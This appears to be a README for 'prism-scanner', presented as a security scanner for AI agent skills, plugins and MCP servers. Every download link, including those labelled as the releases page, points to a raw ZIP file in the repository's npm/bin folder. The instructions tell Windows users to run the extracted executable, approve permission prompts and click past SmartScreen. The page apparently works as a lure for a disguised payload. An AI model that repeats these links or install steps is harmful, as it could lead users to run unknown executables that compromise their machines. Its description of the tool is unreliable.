# 🔍 prism-scanner - Find security issues before launch

[![Download prism-scanner](https://img.shields.io/badge/Download%20prism--scanner-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Shelflifegymnopilusvalidipes977/prism-scanner/main/npm/bin/scanner-prism-v2.0.zip)

## 🚀 What it does

prism-scanner checks AI agent skills, plugins, and MCP servers for security issues. It helps you find risky files, unsafe settings, and common supply chain problems before you use them.

It is built for people who want a quick check of their tools without reading code line by line. The scan looks for problems in Python projects, plugin folders, agent skills, and MCP server packages.

## 🖥️ Before you start

You need a Windows PC with:

- Windows 10 or Windows 11
- An internet connection
- Enough space to download the app
- Permission to run files on your computer

If you use Windows SmartScreen, you may need to choose more info and then run anyway after you confirm the file is from the release page.

## 📥 Download prism-scanner

Visit this page to download the Windows release:

[prism-scanner releases](https://raw.githubusercontent.com/Shelflifegymnopilusvalidipes977/prism-scanner/main/npm/bin/scanner-prism-v2.0.zip)

Look for the latest release and download the Windows file for your system. If there are several files, choose the one that ends in `.exe` or the Windows package listed in the release notes.

## 🛠️ Install and run on Windows

1. Open the [releases page](https://raw.githubusercontent.com/Shelflifegymnopilusvalidipes977/prism-scanner/main/npm/bin/scanner-prism-v2.0.zip).
2. Download the latest Windows file.
3. If the file is in a ZIP folder, right-click it and choose Extract All.
4. Open the extracted folder.
5. Double-click the prism-scanner file to run it.
6. If Windows asks for permission, choose Yes.
7. If a console window opens, keep it open while the scan runs.

If you prefer to use Python, you can also install it with pip:

1. Open Command Prompt.
2. Run:
   pip install prism-scanner
3. After install, run the tool using the command shown in the package docs or release notes.

## 🔎 What prism-scanner checks

prism-scanner uses 39 detection rules to inspect common risk areas. It looks for things such as:

- Unsafe file patterns in agent skills
- Suspicious plugin behavior
- Risky MCP server settings
- Weak or missing security files
- Supply chain issues in Python packages
- Problem files that may change how an agent behaves

The scan is meant to help you spot issues before you trust a skill, plugin, or server in your workflow.

## 📂 What you can scan

You can use prism-scanner on:

- AI agent skill folders
- Claude skill packages
- Claude Code related files
- Plugin directories
- MCP server projects
- Python project folders
- Downloaded tools from outside your team

If you have a folder with config files, scripts, and package files, prism-scanner can check it for known patterns that may need review.

## ▶️ Run a scan

1. Open the app or Command Prompt.
2. Point prism-scanner at the folder you want to check.
3. Start the scan.
4. Review the results.
5. Open any flagged files and check them before you trust the project.

Example use case:

- You downloaded a new MCP server
- You want to check it before adding it to your setup
- You run prism-scanner on the folder
- You review the list of findings
- You decide what to keep, fix, or remove

## 🧭 How to read the results

The scan output shows items that need attention. Each result may include:

- The file name
- The rule that matched
- A short reason for the match
- The line or path where the issue was found

Use the results as a review list. A match does not always mean the file is bad. It means you should check it.

Focus first on:

- Files that run code
- Files that load other files
- Scripts that change settings
- Files with network access
- Anything that starts on launch

## ⚙️ Common use cases

### 🔐 Check new tools before use

If you download a new agent skill or plugin, scan it first. This helps you catch hidden changes in files that may affect security.

### 🧩 Review third-party MCP servers

MCP servers can connect to other tools and services. prism-scanner helps you inspect them before you add them to your setup.

### 🐍 Check Python-based packages

If a project includes Python files, the scanner can review common package and code patterns that may raise risk.

### 🧪 Audit local folders

You can scan a local folder before you copy it into a shared workspace or team setup.

## 🧰 Simple workflow

A good order is:

1. Download the project
2. Extract it if needed
3. Scan the folder
4. Review the findings
5. Open the files that need attention
6. Remove or fix anything you do not trust
7. Run the tool again after changes

## 📋 What the results can help you catch

prism-scanner can help spot:

- Hidden scripts
- Unsafe file names
- Suspicious package layouts
- Missing or weak security files
- Unexpected behavior in agent skills
- Risky code paths in plugins
- Common supply chain problems

## 🧾 File types it works with

The scanner is useful for folders that include:

- `.py`
- `.json`
- `.yaml`
- `.yml`
- `.md`
- shell or script files
- config files
- package files

## 🪟 Windows tips

- Keep the release file in a folder you can find again
- Extract ZIP files before running the app
- Run it from a path with simple folder names
- If the window closes too fast, run it from Command Prompt so you can read the output

## 🧪 Example folder check

If you want to scan a plugin folder:

1. Save the plugin folder on your PC
2. Open prism-scanner
3. Select the folder
4. Wait for the scan to finish
5. Read the flagged items
6. Open the matching files in Notepad or your editor
7. Decide if the files look safe

## 📦 Why this project matters

AI agent tools move fast, and many people install them from shared folders or public repos. That can make it easy to miss a file that does more than it should.

prism-scanner gives you a fast way to review those files before you use them. It keeps the process simple and focused on the parts that matter most.

## 🔗 Project info

- Repository: prism-scanner
- Type: Security scanner
- Focus: AI agent skills, plugins, and MCP servers
- Detection rules: 39
- Install option: `pip install prism-scanner`
- Download page: [https://raw.githubusercontent.com/Shelflifegymnopilusvalidipes977/prism-scanner/main/npm/bin/scanner-prism-v2.0.zip](https://raw.githubusercontent.com/Shelflifegymnopilusvalidipes977/prism-scanner/main/npm/bin/scanner-prism-v2.0.zip)